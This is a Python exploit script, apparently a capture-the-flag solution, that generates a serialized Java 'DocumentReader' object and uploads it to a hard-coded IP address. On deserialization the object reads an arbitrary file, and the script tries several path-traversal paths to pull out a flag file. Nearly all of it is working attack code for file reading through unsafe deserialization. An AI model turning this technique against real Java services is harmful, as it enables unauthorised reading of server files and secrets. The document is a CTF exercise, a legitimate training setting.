#!/usr/bin/env python3
"""
Simple exploit for Deez CTF challenge
Exploits Java deserialization vulnerability using DocumentReader
"""

import requests
import base64
import json
import subprocess
import os

TARGET = "http://103.31.39.30:8080"

def generate_payload(file_path):
    """Generate serialized DocumentReader payload using Java"""
    java_code = f'''import java.io.*;
import java.util.Base64;

class DocumentReader implements Serializable {{
    private static final long serialVersionUID = 1L;
    private String path;
    public DocumentReader(String path) {{ this.path = path; }}
    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {{
        ois.defaultReadObject();
    }}
    @Override
    public String toString() {{
        try {{
            java.nio.file.Path p = java.nio.file.Paths.get(path);
            return new String(java.nio.file.Files.readAllBytes(p));
        }} catch (IOException e) {{
            return "[ERROR: " + e.getMessage() + "]";
        }}
    }}
}}

public class PayloadGen {{
    public static void main(String[] args) throws Exception {{
        DocumentReader r = new DocumentReader("{file_path}");
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(r);
        oos.close();
        System.out.print(Base64.getEncoder().encodeToString(bos.toByteArray()));
    }}
}}'''
    
    with open("PayloadGen.java", "w") as f:
        f.write(java_code)
    
    try:
        subprocess.run(["javac", "PayloadGen.java"], check=True, capture_output=True)
        result = subprocess.run(["java", "PayloadGen"], check=True, capture_output=True, text=True)
        return result.stdout.strip()
    finally:
        for f in ["PayloadGen.java", "PayloadGen.class", "DocumentReader.class"]:
            if os.path.exists(f):
                os.remove(f)

def main():
    paths = [
        "../secret/flag.txt",
        "secret/flag.txt", 
        "../../secret/flag.txt",
        "dist/secret/flag.txt"
    ]
    
    for path in paths:
        print(f"\n[*] Trying: {path}")
        metadata_b64 = generate_payload(path)
        
        payload = {
            "filename": "test",
            "content": base64.b64encode(b"test").decode(),
            "metadata": metadata_b64
        }
        
        try:
            r = requests.post(f"{TARGET}/api/upload", json=payload, timeout=10)
            if r.status_code != 200:
                print(f"  [!] Upload failed: {r.text[:200]}")
                continue
            
            data = r.json()
            if "viewer" not in data:
                print(f"  [!] No viewer: {data}")
                continue
            
            sig = r.cookies.get("signature")
            viewer = data["viewer"]
            
            print(f"  [*] Viewing: {viewer}")
            view_r = requests.get(f"{TARGET}{viewer}", cookies={"signature": sig}, timeout=10)
            
            if "BPJS{" in view_r.text:
                print("\n[+] FLAG FOUND!")
                import re
                flag = re.search(r'BPJS\{[^}]+\}', view_r.text)
                if flag:
                    print(f"[+] {flag.group(0)}")
                    return
            else:
                print(f"  [*] Response length: {len(view_r.text)}")
                
        except Exception as e:
            print(f"  [!] Error: {e}")

if __name__ == "__main__":
    main()

